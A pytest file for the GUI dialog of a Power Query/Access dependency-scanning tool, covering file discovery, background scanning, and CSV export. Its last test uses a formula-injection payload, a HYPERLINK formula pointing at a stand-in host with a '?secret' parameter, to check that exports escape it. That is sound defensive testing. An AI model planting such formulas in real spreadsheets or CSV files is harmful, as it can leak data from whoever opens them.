from pathlib import Path
import time
from threading import current_thread, main_thread

from PySide6.QtCore import Qt
from PySide6.QtWidgets import QApplication, QFileDialog, QMessageBox

from pq_installer.core.reverse_dependencies import DependencyHit, DependencyReport, ScanIssue
from pq_installer.ui.dependency_finder_dialog import DependencyFinderDialog
from pq_installer.ui.main_window import MainWindow


def test_dialog_discovers_folder_selects_consumers_and_multiple_targets(tmp_path):
    app = QApplication.instance() or QApplication([])
    root = tmp_path / "mapped"
    root.mkdir()
    subdir = root / "subfolder"
    subdir.mkdir()
    consumer = root / "Report.xlsx"
    access = subdir / "Warehouse.accdb"
    old = subdir / "Orders.mdb"
    for path in (consumer, access, old):
        path.write_bytes(b"fixture")
    dialog = DependencyFinderDialog()

    dialog.add_scan_paths([root], recursive=True)
    dialog.add_target_paths([access, old])

    assert dialog.consumer_list.count() == 3
    assert len(dialog.consumer_list.selectedItems()) == 3
    assert dialog.target_list.count() == 2
    assert dialog.run_button.isEnabled()
    dialog.close()


def test_vector_finder_laptop_scroll_and_existing_actions(tmp_path):
    from PySide6.QtWidgets import QScrollArea
    app = QApplication.instance() or QApplication([])
    dialog = DependencyFinderDialog()
    scroller = dialog.findChild(QScrollArea)
    assert scroller is not None and scroller.isWidgetResizable()
    assert dialog.run_button.accessibleName() == "Run read-only dependency scan"
    assert dialog.add_files_button.text() == "Add files…"
    assert dialog.add_folder_button.text() == "Add folder…"
    assert dialog.add_targets_button.text() == "Add target file(s)…"
    assert dialog.from_consumers_button.text() == "Use selected files as targets"
    assert dialog.remove_targets_button.text() == "Remove selected targets"
    assert dialog.export_csv_button.text() == "Export CSV…"
    path = tmp_path / "Warehouse.accdb"
    path.write_bytes(b"fixture")
    dialog.add_scan_paths([path])
    dialog.add_target_paths([path])
    assert "1 candidate" in dialog.consumer_count_label.text()
    assert "1 selected target" in dialog.target_count_label.text()
    dialog.mode_combo.setCurrentIndex(dialog.mode_combo.findData("map"))
    assert dialog.graph_button.isEnabled() is False  # no completed map report yet
    dialog.resize(760, 560)
    dialog.show()
    app.processEvents()
    assert dialog.width() >= 760 and dialog.height() >= 560
    dialog.close()


def test_dialog_runs_in_worker_and_shows_incoming_results(tmp_path):
    app = QApplication.instance() or QApplication([])
    target = tmp_path / "Warehouse.accdb"
    consumer = tmp_path / "Report.xlsx"
    target.write_bytes(b"db")
    consumer.write_bytes(b"fixture")
    calls = []

    def runner(targets, consumers, *, progress=None, cancelled=None, depth="deep"):
        calls.append((targets, consumers))
        assert depth == "deep"
        progress(1, 1, str(consumer))
        return DependencyReport(tuple(map(str, targets)), tuple(map(str, consumers)), (
            DependencyHit(str(target), str(consumer), "Power Query", "Inventory", "exact_path", target.name),
        ), (ScanIssue(str(consumer), "dynamic_reference", "Dynamic source."),))

    dialog = DependencyFinderDialog(scan_runner=runner)
    dialog.add_scan_paths([consumer])
    dialog.add_target_paths([target])
    dialog.run_button.click()
    deadline = time.monotonic() + 3
    while dialog.latest_report is None and time.monotonic() < deadline:
        app.processEvents()
        time.sleep(.01)

    assert calls and calls[0][0] == (target,)
    assert calls[0][1] == (consumer,)
    assert dialog.results_table.rowCount() == 1
    assert "Warehouse.accdb" in dialog.results_table.item(0, 0).text()
    assert "dynamic_reference" in dialog.coverage_text.toPlainText()
    dialog.close()


def test_main_window_exposes_separate_dependency_finder_entrypoint():
    app = QApplication.instance() or QApplication([])
    window = MainWindow()
    assert window.dependency_finder_button.text() == "Dependency Finder…"
    assert window.dependency_finder_button.isEnabled()
    window.close()


def test_csv_export_preserves_coverage_warnings(tmp_path, monkeypatch):
    app = QApplication.instance() or QApplication([])
    dialog = DependencyFinderDialog()
    dialog.latest_report = DependencyReport(("C:\\Warehouse.accdb",), ("C:\\Legacy.xls",), (), (
        ScanIssue("C:\\Legacy.xls", "unsupported", "Old Excel format not inspected."),
    ))
    destination = tmp_path / "report.csv"
    monkeypatch.setattr(QFileDialog, "getSaveFileName", lambda *a, **k: (str(destination), "CSV (*.csv)"))
    monkeypatch.setattr(QMessageBox, "information", lambda *a, **k: None)

    dialog._export("csv")

    assert "unsupported" in destination.read_text(encoding="utf-8")
    dialog.close()


def test_zero_match_csv_still_identifies_targets_and_scan_scope(tmp_path, monkeypatch):
    app = QApplication.instance() or QApplication([])
    dialog = DependencyFinderDialog()
    target = tmp_path / "Warehouse.accdb"
    dialog.latest_report = DependencyReport((str(target),), (str(tmp_path / "Report.xlsx"),), (), ())
    destination = tmp_path / "no-matches.csv"
    monkeypatch.setattr(QFileDialog, "getSaveFileName", lambda *a, **k: (str(destination), "CSV (*.csv)"))
    monkeypatch.setattr(QMessageBox, "information", lambda *a, **k: None)

    dialog._export("csv")

    contents = destination.read_text(encoding="utf-8")
    assert str(target) in contents
    assert "no_matches" in contents
    dialog.close()


def test_folder_button_inventories_on_background_thread(tmp_path, monkeypatch):
    from pq_installer.ui import dependency_finder_dialog as module

    app = QApplication.instance() or QApplication([])
    target = tmp_path / "Report.xlsx"
    target.write_bytes(b"example")
    monkeypatch.setattr(QFileDialog, "getExistingDirectory", lambda *a, **k: str(tmp_path))
    calls = []

    def slow_discovery(paths, *, recursive=True, cancelled=None):
        calls.append((current_thread() is not main_thread(), recursive))
        time.sleep(.12)
        return (target,)

    monkeypatch.setattr(module, "discover_scan_files", slow_discovery)
    dialog = DependencyFinderDialog()
    start = time.monotonic()
    dialog.add_folder_button.click()
    assert time.monotonic() - start < .09
    deadline = time.monotonic() + 3
    while dialog.consumer_list.count() < 1 and time.monotonic() < deadline:
        app.processEvents()
        time.sleep(.01)

    assert calls == [(True, True)]
    assert dialog.consumer_list.item(0).text() == str(target)
    deadline = time.monotonic() + 3
    while dialog._inventory_running and time.monotonic() < deadline:
        app.processEvents()
        time.sleep(.01)
    dialog.close()


def test_csv_escapes_untrusted_formula_like_query_names(tmp_path, monkeypatch):
    app = QApplication.instance() or QApplication([])
    target = str(tmp_path / "Warehouse.accdb")
    workbook = str(tmp_path / "Report.xlsx")
    malicious_name = '=HYPERLINK("https://example.invalid/?secret", "click")'
    dialog = DependencyFinderDialog()
    dialog.latest_report = DependencyReport((target,), (workbook,), (
        DependencyHit(target, workbook, "Excel connection", malicious_name, "exact_path", "Warehouse.accdb"),
    ), ())
    destination = tmp_path / "safe.csv"
    monkeypatch.setattr(QFileDialog, "getSaveFileName", lambda *a, **k: (str(destination), "CSV (*.csv)"))
    monkeypatch.setattr(QMessageBox, "information", lambda *a, **k: None)

    dialog._export("csv")

    import csv
    with destination.open(newline="", encoding="utf-8") as source:
        row = next(entry for entry in csv.DictReader(source) if entry["row_type"] == "dependency")
    assert row["source_name"] == "'" + malicious_name
    dialog.close()
